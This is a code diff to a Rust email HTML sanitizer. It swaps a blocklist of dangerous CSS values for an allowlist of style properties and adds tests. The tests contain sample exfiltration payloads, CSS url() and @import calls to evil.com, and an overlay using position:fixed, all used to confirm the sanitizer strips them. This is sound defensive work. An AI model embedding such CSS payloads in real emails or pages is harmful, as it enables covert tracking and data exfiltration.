@@ -38,6 +38,88 @@ impl Default for PrivacyGuard {
     }
 }
 
+/// Parse a CSS style string and keep only properties from the safe allowlist.
+fn filter_css_properties(style: &str) -> String {
+    const SAFE_PROPERTIES: &[&str] = &[
+        "color",
+        "background-color",
+        "background",
+        "font-family",
+        "font-size",
+        "font-style",
+        "font-weight",
+        "font-variant",
+        "text-align",
+        "text-decoration",
+        "text-indent",
+        "text-transform",
+        "line-height",
+        "letter-spacing",
+        "word-spacing",
+        "white-space",
+        "vertical-align",
+        "direction",
+        "margin",
+        "margin-top",
+        "margin-right",
+        "margin-bottom",
+        "margin-left",
+        "padding",
+        "padding-top",
+        "padding-right",
+        "padding-bottom",
+        "padding-left",
+        "border",
+        "border-top",
+        "border-right",
+        "border-bottom",
+        "border-left",
+        "border-color",
+        "border-style",
+        "border-width",
+        "border-collapse",
+        "border-spacing",
+        "width",
+        "max-width",
+        "min-width",
+        "height",
+        "max-height",
+        "min-height",
+        "display",
+        "overflow",
+        "visibility",
+        "list-style",
+        "list-style-type",
+        "table-layout",
+    ];
+
+    style
+        .split(';')
+        .filter_map(|decl| {
+            let decl = decl.trim();
+            if decl.is_empty() {
+                return None;
+            }
+            let colon = decl.find(':')?;
+            let prop = decl[..colon].trim().to_lowercase();
+            let value = decl[colon + 1..].trim().to_lowercase();
+            if !SAFE_PROPERTIES.contains(&prop.as_str()) {
+                return None;
+            }
+            // Double-check: reject values with URL or script references
+            if value.contains("url(")
+                || value.contains("expression(")
+                || value.contains("javascript:")
+                || value.contains("vbscript:")
+            {
+                return None;
+            }
+            Some(decl.to_string())
+        })
+        .collect::<Vec<_>>()
+        .join("; ")
+}
+
 /// Build an ammonia sanitizer configured for safe email HTML rendering.
 fn build_sanitizer(_mode: &PrivacyMode) -> Builder<'static> {
     let mut builder = Builder::new();
@@ -127,20 +209,14 @@ fn build_sanitizer(_mode: &PrivacyMode) -> Builder<'static> {
     // Add rel="noopener noreferrer" to all links
     builder.link_rel(Some("noopener noreferrer"));
 
-    // Filter dangerous CSS values in style attributes
+    // Filter style attributes using a CSS property allowlist
     builder.attribute_filter(|_element, attribute, value| {
         if attribute == "style" {
-            let lower = value.to_lowercase();
-            let dangerous = [
-                "url(", "expression(", "behavior:", "binding:",
-                "-moz-binding", "javascript:", "vbscript:",
-                "position:fixed", "position: fixed",
-                "position:absolute", "position: absolute",
-            ];
-            if dangerous.iter().any(|p| lower.contains(p)) {
+            let filtered = filter_css_properties(value);
+            if filtered.is_empty() {
                 None
             } else {
-                Some(value.into())
+                Some(filtered.into())
             }
         } else {
             Some(value.into())
@@ -485,5 +561,39 @@ mod tests {
         assert!(!result.html.contains("svg"));
         assert!(result.html.contains("Before"));
         assert!(result.html.contains("After"));
+    }
+
+    #[test]
+    fn test_blocks_css_url_exfiltration() {
+        let guard = PrivacyGuard::new();
+        let html = r#"<p style="background: url('https://evil.com/steal')">text</p>"#;
+        let result = guard.render_safe_html(html, &PrivacyMode::Strict);
+        assert!(!result.html.contains("evil.com"));
+    }
+
+    #[test]
+    fn test_blocks_css_import() {
+        let guard = PrivacyGuard::new();
+        let html = r#"<div style="@import url('https://evil.com/exfil.css')">text</div>"#;
+        let result = guard.render_safe_html(html, &PrivacyMode::Strict);
+        assert!(!result.html.contains("evil.com"));
+    }
+
+    #[test]
+    fn test_allows_safe_css_properties() {
+        let guard = PrivacyGuard::new();
+        let html = r#"<p style="color: red; font-size: 14px; margin: 10px">text</p>"#;
+        let result = guard.render_safe_html(html, &PrivacyMode::Strict);
+        assert!(result.html.contains("color: red"));
+        assert!(result.html.contains("font-size: 14px"));
+    }
+
+    #[test]
+    fn test_blocks_position_properties() {
+        let guard = PrivacyGuard::new();
+        let html = r#"<div style="position: fixed; top: 0; left: 0; z-index: 9999">overlay</div>"#;
+        let result = guard.render_safe_html(html, &PrivacyMode::Strict);
+        assert!(!result.html.contains("position"));
+        assert!(!result.html.contains("z-index"));
     }
 }
